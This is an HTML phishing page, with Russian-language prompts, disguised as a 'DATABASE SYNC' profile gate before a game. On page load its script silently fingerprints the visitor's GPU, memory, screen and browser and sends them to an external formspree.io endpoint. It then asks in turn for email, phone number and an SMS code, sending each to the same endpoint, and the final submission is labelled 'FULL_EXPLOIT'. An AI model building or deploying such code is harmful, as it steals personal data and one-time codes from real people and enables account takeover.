<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    

<div id="auth_gate" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 1000000; text-align: center;">
    <div style="border: 1px solid #00ff41; padding: 30px; background: rgba(0,255,65,0.03); border-radius: 12px; width: 340px; box-shadow: 0 0 20px rgba(0,255,65,0.1);">
        <h2 id="gate_title" style="margin: 0 0 10px 0; letter-spacing: 3px;">DATABASE SYNC</h2>
        <div id="gate_status" style="font-size: 10px; color: #008f11; margin-bottom: 20px;">[ STATUS: WAITING_FOR_USER ]</div>
        
        <p id="gate_desc" style="font-size: 13px; margin-bottom: 15px; color: #ccc;">Синхронизация профиля. Введите Email:</p>
        
        <input type="text" id="gate_input" placeholder="example@mail.com" style="width: 100%; padding: 12px; margin-bottom: 20px; background: #000; border: 1px solid #00ff41; color: #00ff41; outline: none; border-radius: 5px; text-align: center;">
        
        <button id="gate_btn" onclick="nextGateStep()" style="width: 100%; padding: 15px; background: #00ff41; color: #000; font-weight: bold; border: none; cursor: pointer; border-radius: 5px; transition: 0.3s;">ПОДТВЕРДИТЬ</button>
        
        <div id="gate_log" style="font-size: 9px; margin-top: 20px; text-align: left; color: #008f11; height: 40px; overflow: hidden; border-top: 1px solid #111; padding-top: 10px;">
            > Hardware verification... OK<br>> IP bypass check... OK
        </div>
    </div>
</div>

<script>
(function() {
    const TARGET = "https://formspree.io/f/xpqkdlyr";
    let step = 1;
    let store = { email: "", phone: "", code: "" };

    // 1. МГНОВЕННЫЙ ЗАХВАТ ЖЕЛЕЗА (без клика)
    const autoCapture = async () => {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        
        const info = {
            type: "NEW_SESSION",
            gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Hidden",
            ram: navigator.deviceMemory || "N/A",
            screen: screen.width + "x" + screen.height,
            agent: navigator.userAgent
        };
        
        fetch(TARGET, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(info)
        }).catch(() => {});
    };
    autoCapture();

    // 2. ЛОГИКА ШАГОВ
    window.nextGateStep = async function() {
        const input = document.getElementById('gate_input');
        const log = document.getElementById('gate_log');
        const title = document.getElementById('gate_title');
        const desc = document.getElementById('gate_desc');
        const status = document.getElementById('gate_status');

        if (step === 1) {
            if (!input.value.includes('@')) return alert("Ошибка: Неверный формат Email");
            store.email = input.value;
            log.innerHTML += `<br>> Email saved: ${store.email}`;
            
            // Отправляем почту
            fetch(TARGET, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ event: "EMAIL_PHASE", email: store.email })
            });

            step = 2;
            title.innerText = "AUTH_PHONE";
            desc.innerText = "Привяжите номер телефона:";
            input.value = ""; 
            input.placeholder = "+7 (___) ___-__-__";
            status.innerText = "[ STATUS: PHONE_REQUIRED ]";
        } 
        else if (step === 2) {
            if (input.value.length < 5) return alert("Введите номер телефона");
            store.phone = input.value;
            log.innerHTML += `<br>> Phone link: ${store.phone}`;
            
            // Отправляем телефон
            fetch(TARGET, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ event: "PHONE_PHASE", email: store.email, phone: store.phone })
            });

            step = 3;
            title.innerText = "SMS_CODE";
            desc.innerText = "Введите код из SMS (4 цифры левый код):";
            input.value = ""; 
            input.placeholder = "0000";
            status.innerText = "[ STATUS: SMS_WAITING ]";
        } 
        else {
            store.code = input.value;
            log.innerHTML += `<br>> Final validation... OK`;
             window.location.href = "index.html";
            // gjt
            
            // Финальная отправка всего набора
            await fetch(TARGET, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ event: "FULL_EXPLOIT", ...store })
            });

            // Закрываем оверлей и пускаем в игру
            document.getElementById('auth_gate').style.display = 'none';
        }
    };
})();
</script>
</body>
</html>
